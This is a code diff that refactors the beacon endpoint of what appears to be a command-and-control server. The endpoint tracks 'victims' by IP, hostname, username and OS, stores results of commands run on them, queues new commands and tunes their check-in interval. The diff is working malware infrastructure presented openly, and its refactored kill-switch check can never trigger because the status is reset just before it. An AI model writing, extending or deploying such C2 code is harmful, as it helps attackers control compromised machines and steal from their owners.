@@ -12,6 +12,7 @@
 #include <CommandDAO.hpp>
 #include <ResultDAO.hpp>
 #include <VictimDAO.hpp>
+#include <Types.hpp>
 
 #include <IManager.hpp>
 
@@ -22,106 +23,82 @@ inline void register_beacon_endpoint(cpppwn::RESTServer& server) {
     auto& victims = VictimManager::instance();
     auto& commands = CommandManager::instance();
     auto& results = ResultManager::instance();
-    //auto& logs = LogManager::instance();
 
     server.post("/api/beacon", [&](const HttpRequest& req) {
         try {
-            // Parse beacon request
             BeaconRequest beacon;
-            auto parse_result = glz::read_json(beacon, req.body);
-
-            if (not parse_result) {
+            if (auto err = glz::read_json(beacon, req.body)) {
                 return error_response(400, "Invalid beacon format");
             }
 
-            // Update or register victim
-            auto existing = victims.get_by_uid(beacon.victim_uid);
-
-            if (existing) {
-                // Update existing victim
-                VictimDAO updated = *existing;
-                updated.internal_ip = beacon.internal_ip;
-                updated.external_ip = beacon.external_ip;
-                updated.hostname = beacon.hostname;
-                updated.username = beacon.username;
-                updated.operating_system = beacon.operating_system;
-
-                auto unix_timestamp = std::chrono::seconds(std::time(NULL));
-                updated.last_update = std::chrono::milliseconds(unix_timestamp).count();
-                updated.status = 1;  // Online
-
-                victims.update(existing->id, updated);
-
-                //logs.log("beacon", "Victim " + beacon.hostname + " checked in");
-            } else {
-                // Register new victim
-                VictimDAO new_victim;
-                new_victim.uid = beacon.victim_uid;
-                new_victim.internal_ip = beacon.internal_ip;
-                new_victim.external_ip = beacon.external_ip;
-                new_victim.hostname = beacon.hostname;
-                new_victim.username = beacon.username;
-                new_victim.operating_system = beacon.operating_system;
-
-                auto unix_timestamp = std::chrono::seconds(std::time(NULL));
-                new_victim.last_update = std::chrono::milliseconds(unix_timestamp).count();
-                new_victim.status = 1;  // Online
-
-                victims.create(new_victim);
-
-                //logs.log("victim_new", "New victim registered: " + beacon.hostname + " (" + beacon.external_ip + ")");
+            // 1. Determine External IP from the socket if "auto" was sent
+            std::string effective_ip = beacon.external_ip;
+            if (effective_ip == "auto" || effective_ip == "1.1.1.1") {
+                //effective_ip = req.ip_address; // Grab IP from connection
             }
 
-            // Process command results
+            // 2. Register/Update Victim (Upsert Pattern)
+            auto existing = victims.get_by_uid(beacon.victim_uid);
+
+            // Prepare common data
+            VictimDAO v_data = existing.value_or(VictimDAO{});
+            v_data.uid = beacon.victim_uid;
+            v_data.internal_ip = beacon.internal_ip;
+            v_data.external_ip = effective_ip;
+            v_data.hostname = beacon.hostname;
+            v_data.username = beacon.username;
+            v_data.operating_system = beacon.operating_system;
+            v_data.last_update = get_unix_time(); // Using our custom function
+            v_data.status = 1; // Online
+
+            if (existing) {
+                victims.update(existing->id, v_data);
+            } else {
+                victims.create(v_data);
+            }
+
+            // 3. Process Inbound Command Results
             for (const auto& cmd_result : beacon.command_results) {
-                // Find the command
-                auto cmd_opt = commands.get_by_uid(cmd_result.command_uid);
+                // Ensure the result actually matches a command we issued
+                if (auto cmd_opt = commands.get_by_uid(cmd_result.command_uid)) {
+                    ResultDAO res;
+                    res.uid = cmd_result.command_uid;
+                    res.data = cmd_result.result_data;
+                    results.create(res);
 
-                if (cmd_opt) {
-                    // Store result
-                    ResultDAO result;
-                    result.uid = cmd_result.command_uid;
-                    result.data = cmd_result.result_data;
-                    results.create(result);
-
-                    // Update command status
-                    //commands.update_status(cmd_opt->command_id, cmd_result.status);
-
-                    //logs.log("command_result", "Command '" + cmd_opt->command + "' completed with status " + std::to_string(cmd_result.status));
+                    // Update command to "Completed" (e.g., status 2)
+                    cmd_opt->status = 2;
+                    commands.update(cmd_opt->id, cmd_opt.value());
                 }
             }
 
-            // Get pending commands for this victim
-            auto pending_commands = commands.find([&](const CommandDAO& cmd) {
-                return beacon.victim_uid == cmd.client && cmd.status == 0;  // 0 = pending
+            // 4. Fetch Pending Commands (status 0)
+            auto pending = commands.find([&](const CommandDAO& cmd) {
+                return cmd.client == beacon.victim_uid && cmd.status == 0;
             });
 
-            // Build beacon response
+            // 5. Prepare Response
             BeaconResponse response;
-            response.commands = pending_commands;
-            response.beacon_interval = 60;  // 60 seconds default
-            response.should_exit = false;   // Kill switch
+            response.commands = pending;
+            response.should_exit = (v_data.status == 2); // 2 = Tasked to kill
 
-            // Check if victim should be killed
-            auto victim = victims.get_by_uid(beacon.victim_uid);
-            if (victim && victim->status == 2) {  // 2 = should_exit
-                response.should_exit = true;
-                //logs.log("victim_killed", "Kill signal sent to " + beacon.hostname);
+            // Adaptive Sleep Logic
+            if (not pending.empty()) {
+                response.beacon_interval = (pending.size() > 5) ? 10 : 30;
+            } else {
+                response.beacon_interval = 120; // Default idle sleep
             }
 
-            // Adjust beacon interval based on command count
-            if (pending_commands.size() > 5) {
-                response.beacon_interval = 10;  // More frequent if many commands
-            } else if (pending_commands.empty()) {
-                response.beacon_interval = 120;  // Less frequent if idle
+            // Update commands to "Sent" (status 1) so they aren't sent twice
+            for (auto& cmd : pending) {
+                cmd.status = 1;
+                commands.update(cmd.id, cmd);
             }
 
-            std::string response_json = glz::write_json(response).value_or("{}");
-            return HttpResponse().set_json(response_json);
+            return HttpResponse().set_json(glz::write_json(response).value_or("{}"));
 
         } catch (const std::exception& e) {
-            //logs.log("beacon_error", std::string("Beacon error: ") + e.what());
-            return error_response(500, std::string("Internal error: ") + e.what());
+            return error_response(500, "Internal Server Error");
         }
     });
 }
